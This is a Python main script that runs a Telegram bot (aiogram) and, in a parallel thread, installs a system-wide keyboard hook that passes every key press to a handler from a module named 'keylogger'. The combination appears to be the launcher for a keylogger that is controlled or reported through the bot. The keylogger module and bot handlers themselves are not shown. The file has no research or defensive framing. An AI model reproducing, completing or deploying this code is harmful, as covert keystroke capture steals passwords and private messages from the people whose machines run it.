from aiogram.fsm.storage.memory import MemoryStorage

from handlers import router
from aiogram import Bot, Dispatcher
from dotenv import load_dotenv
import os
import keyboard
from keylogger import on_press

import threading
import asyncio

load_dotenv()
async def main():
    bot = Bot(token=os.getenv('TOKEN'))
    dp = Dispatcher(storage=MemoryStorage())

    dp.include_router(router)
    await bot.delete_webhook(drop_pending_updates=True)
    await dp.start_polling(bot)

def start_listener():
    keyboard.on_press(on_press)
    keyboard.wait()

if __name__ == '__main__':
    listener_thread = threading.Thread(target=start_listener)
    listener_thread.start()

    try:
        asyncio.run(main())
    except KeyboardInterrupt:
        pass